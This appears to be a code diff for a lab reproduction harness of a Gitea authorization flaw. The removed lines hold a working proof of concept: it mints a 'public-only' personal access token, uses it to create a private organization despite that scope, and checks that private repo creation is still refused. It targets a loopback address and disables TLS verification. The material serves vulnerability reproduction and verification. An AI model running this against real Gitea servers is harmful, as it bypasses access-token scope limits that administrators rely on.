@@ -222,133 +222,26 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-from __future__ import annotations
+"""Gitea <= 1.27.3 public-only PAT creates a private organization. Loopback lab client."""
 
-import base64
-import json
-import ssl
+import os
+import subprocess
 import sys
-import uuid
-import urllib.error
-import urllib.request
+from pathlib import Path
 
-BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18132").rstrip("/")
-USER = sys.argv[2] if len(sys.argv) > 2 else "labuser"
-PASSWORD = sys.argv[3] if len(sys.argv) > 3 else "LabPass123!"
-SUFFIX = uuid.uuid4().hex[:8]
-ORG = f"privorg{SUFFIX}"
-REPO = f"privrepo{SUFFIX}"
-TOKEN_NAME = f"public-only-{SUFFIX}"
-# write:user is required to reach POST /user/repos (outer /user group); then
-# rejectPublicOnly() is the intended deny for a private repo.
-SCOPES = ["public-only", "write:organization", "write:repository", "write:user"]
-CTX = ssl._create_unverified_context()
+HERE = Path(__file__).resolve().parent
+LAB = HERE / "lab"
 
 
-def req(
-    method: str,
-    path: str,
-    data: dict | None = None,
-    *,
-    basic: tuple[str, str] | None = None,
-    token: str | None = None,
-) -> tuple[int, str]:
-    hdrs = {"Content-Type": "application/json", "User-Agent": "gitea-public-only-pat-org-lab"}
-    if basic:
-        tok = base64.b64encode(f"{basic[0]}:{basic[1]}".encode()).decode()
-        hdrs["Authorization"] = "Basic " + tok
-    if token:
-        hdrs["Authorization"] = "token " + token
-    body = None if data is None else json.dumps(data).encode()
-    r = urllib.request.Request(BASE + path, data=body, headers=hdrs, method=method)
-    try:
-        with urllib.request.urlopen(r, timeout=30, context=CTX) as resp:
-            return resp.status, resp.read().decode("utf-8", "replace")
-    except urllib.error.HTTPError as exc:
-        return exc.code, exc.read().decode("utf-8", "replace")
-
-
-def parse(body: str) -> dict:
-    try:
-        obj = json.loads(body)
-    except json.JSONDecodeError:
-        return {}
-    return obj if isinstance(obj, dict) else {}
-
-
-def is_private_org(obj: dict) -> bool:
-    vis = str(obj.get("visibility") or "").lower()
-    if vis == "private":
-        return True
-    return obj.get("private") is True
-
-
-def main() -> None:
-    print(f"IOC base={BASE} user={USER} org={ORG} repo={REPO}")
-    s, b = req("GET", "/api/v1/version")
-    print(f"IOC version status={s} snippet={b[:120]!r}")
-    if s != 200:
-        print("FAIL version")
-        raise SystemExit(1)
-
-    s, b = req(
-        "POST",
-        f"/api/v1/users/{USER}/tokens",
-        {"name": TOKEN_NAME, "scopes": SCOPES},
-        basic=(USER, PASSWORD),
+def main() -> int:
+    os.chdir(LAB)
+    completed = subprocess.run(
+        ["bash", str(LAB / "run.sh"), *sys.argv[1:]],
+        check=False,
     )
-    print(f"IOC token-create status={s} snippet={b[:240]!r}")
-    tok = parse(b)
-    sha = str(tok.get("sha1") or "")
-    scopes = tok.get("scopes") or []
-    if s not in (200, 201) or not sha:
-        print("FAIL token create")
-        raise SystemExit(1)
-    scope_blob = ",".join(str(x) for x in scopes) if isinstance(scopes, list) else str(scopes)
-    if "public-only" not in scope_blob:
-        print(f"FAIL token missing public-only scopes={scope_blob!r}")
-        raise SystemExit(1)
-    print(f"IOC token-scopes={scope_blob}")
-
-    s_org, b_org = req(
-        "POST",
-        "/api/v1/orgs",
-        {"username": ORG, "visibility": "private", "full_name": "private-org-lab"},
-        token=sha,
-    )
-    print(f"IOC org-create status={s_org} snippet={b_org[:280]!r}")
-    if s_org == 403 and "public-only" in b_org.lower():
-        print("FAIL org create rejected by public-only")
-        raise SystemExit(1)
-    created = parse(b_org)
-    if s_org not in (200, 201) or not is_private_org(created):
-        print("FAIL org create did not yield a private org")
-        raise SystemExit(1)
-
-    s_get, b_get = req("GET", f"/api/v1/orgs/{ORG}", basic=(USER, PASSWORD))
-    print(f"IOC org-get status={s_get} snippet={b_get[:280]!r}")
-    got = parse(b_get)
-    if s_get != 200 or not is_private_org(got):
-        print("FAIL GET as user did not show visibility=private")
-        raise SystemExit(1)
-    print(f"IOC org-visibility={got.get('visibility')!r} private={got.get('private')!r}")
-
-    s_repo, b_repo = req(
-        "POST",
-        "/api/v1/user/repos",
-        {"name": REPO, "private": True},
-        token=sha,
-    )
-    print(f"IOC user-repo-create status={s_repo} snippet={b_repo[:280]!r}")
-    if s_repo in (200, 201):
-        print("FAIL public-only token created a private user repo (negative failed)")
-        raise SystemExit(1)
-    if s_repo != 403 or "public-only" not in b_repo.lower():
-        print("FAIL expected public-only 403 on private user repo create")
-        raise SystemExit(1)
-    print("SUCCESS GITEA-PUBLIC-ONLY-PAT")
+    return int(completed.returncode)
 
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
 
